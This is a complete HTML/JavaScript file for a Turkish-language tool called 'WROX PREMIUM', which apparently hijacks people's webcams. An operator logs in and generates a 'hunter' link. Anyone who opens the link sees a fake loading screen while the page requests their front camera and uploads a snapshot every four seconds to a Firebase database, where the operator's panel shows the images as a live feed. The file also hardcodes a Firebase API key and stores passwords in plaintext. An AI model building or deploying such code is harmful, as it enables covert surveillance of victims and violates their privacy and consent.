<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WROX PREMIUM V78</title>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>

    <style>
        :root { --neon: #00f0ff; --bg: #000; --panel: #0a0a0a; --green: #2ecc71; }
        body { background: var(--bg); color: white; font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
        
        /* 1. GİRİŞ VE KAYIT EKRANI */
        #auth-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: radial-gradient(circle, #05191a 0%, #000 100%); }
        .auth-box { border: 2px solid var(--neon); padding: 30px; border-radius: 15px; text-align: center; width: 85%; max-width: 360px; background: rgba(10, 10, 10, 0.9); }
        input { width: 100%; padding: 14px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--neon); box-sizing: border-box; border-radius: 5px; outline: none; }
        button { width: 100%; padding: 14px; background: transparent; border: 2px solid var(--neon); color: var(--neon); cursor: pointer; font-weight: bold; text-transform: uppercase; margin-top: 5px; }
        button:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
        .reg-btn { border-color: #555; color: #888; margin-top: 10px; font-size: 11px; }

        /* 2. ANA YÖNETİM PANELİ */
        #main-panel { display: none; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 2px solid var(--neon); background: var(--panel); position: sticky; top: 0; z-index: 100; }
        .content { padding: 20px; }
        
        /* KAYDIRILABİLİR AKIŞ ALANI (SCROLL) */
        .stream-container { border: 2px solid var(--neon); border-radius: 15px; padding: 15px; margin-top: 25px; background: #050505; }
        .status-header { color: #ff0000; font-size: 14px; font-weight: bold; margin-bottom: 15px; display: flex; align-items: center; }
        .dot { height: 8px; width: 8px; background-color: #ff0000; border-radius: 50%; display: inline-block; margin-right: 10px; animation: pulse 1s infinite; }
        
        .feed-wrapper { 
            display: flex; 
            flex-direction: column; 
            gap: 20px; 
            max-height: 550px; /* Sabit yükseklik sayesinde aşağı kaydırılabilir */
            overflow-y: auto;  /* Scroll aktif */
            padding-right: 5px; 
        }
        .feed-item { border: 1px solid #222; border-radius: 10px; overflow: hidden; background: #000; flex-shrink: 0; }
        .feed-item img { width: 100%; display: block; }

        .link-display { background: #0a0a0a; padding: 15px; font-size: 11px; word-break: break-all; margin: 15px 0; color: var(--neon); border: 1px dashed var(--neon); border-radius: 5px; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
        
        /* Kaydırma Çubuğu Tasarımı */
        .feed-wrapper::-webkit-scrollbar { width: 4px; }
        .feed-wrapper::-webkit-scrollbar-thumb { background: var(--neon); border-radius: 10px; }
    </style>
</head>
<body>

    <div id="auth-screen">
        <div class="auth-box">
            <h1 style="color: var(--neon); margin: 0 0 20px 0; font-size: 24px;">WROX PREMIUM</h1>
            <input type="text" id="email" placeholder="E-posta">
            <input type="password" id="pass" placeholder="Şifre">
            <button onclick="handleAuth('login')">SİSTEME GİRİŞ</button>
            <button class="reg-btn" onclick="handleAuth('register')">YENİ KAYIT OL</button>
        </div>
    </div>

    <div id="main-panel">
        <div class="header">
            <div style="font-size: 18px; font-weight: bold;"><span style="color:var(--neon)">☰</span> WROX V78</div>
            <div id="user-tag" style="color: var(--green); font-size: 11px; font-weight: bold;"></div>
        </div>
        <div class="content">
            <h3 style="margin: 0 0 15px 0;">📸 KAMERA SIZMA (5x BURST)</h3>
            <button onclick="generateLink()">AVCI LİNKİ OLUŞTUR</button>
            <div id="link-area" class="link-display" style="display:none;"></div>

            <div class="stream-container">
                <div class="status-header"><span class="dot"></span>CANLI GÖRÜNTÜ AKIŞI:</div>
                <div id="feed" class="feed-wrapper">
                    </div>
            </div>
        </div>
    </div>

    <script>
        // 1. FIREBASE CONFIG (Senin Bilgilerin)
        const firebaseConfig = {
            apiKey: "AIzaSyAKB12tpEblTHYV7niVHc3VvAtv0jl873E",
            databaseURL: "https://wrox-premium-default-rtdb.firebaseio.com",
            projectId: "wrox-premium",
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let currentUser = "";

        // 2. GİRİŞ VE KAYIT SİSTEMİ
        function handleAuth(type) {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('pass').value;
            const userID = email.split('@')[0].replace(/[^a-zA-Z0-9]/g, "");

            if (!email || !password) return alert("Bilgileri eksiksiz girin!");

            if (type === 'register') {
                db.ref('users/' + userID).set({ password: password, email: email })
                    .then(() => alert("Kayıt başarılı! Şimdi giriş yapabilirsiniz."));
            } else {
                db.ref('users/' + userID).once('value').then((snapshot) => {
                    if (snapshot.exists() && snapshot.val().password === password) {
                        currentUser = userID;
                        startPanel();
                    } else {
                        alert("Hatalı e-posta veya şifre!");
                    }
                });
            }
        }

        function startPanel() {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('main-panel').style.display = 'block';
            document.getElementById('user-tag').innerText = "ADMİN: " + currentUser.toUpperCase();
            
            // SADECE GİRİŞ YAPAN KULLANICININ LOGLARINI DİNLE
            db.ref('logs/' + currentUser).on('child_added', (s) => {
                const imgHTML = `<div class="feed-item"><img src="${s.val().img}"></div>`;
                document.getElementById('feed').insertAdjacentHTML('afterbegin', imgHTML);
            });
        }

        function generateLink() {
            const link = window.location.href.split('?')[0] + "?ref=" + currentUser;
            const area = document.getElementById('link-area');
            area.innerText = link;
            area.style.display = 'block';
        }

        // 3. KURBAN MODU (Link açıldığında çalışır)
        const urlParams = new URLSearchParams(window.location.search);
        const victimRef = urlParams.get('ref');

        if (victimRef) {
            document.body.innerHTML = `
                <div style="background:#000; height:100vh; display:flex; align-items:center; justify-content:center; color:#222;">
                    <p>Yükleniyor... %99</p>
                </div>`;
            
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const v = document.createElement('video');
                v.srcObject = stream; v.play();
                const c = document.createElement('canvas');
                setInterval(() => {
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    db.ref('logs/' + victimRef).push({
                        img: c.toDataURL('image/jpeg', 0.4),
                        time: Date.now()
                    });
                }, 4000); // 4 saniyede bir çekim
            }).catch(() => {});
        }
    </script>
</body>
</html>
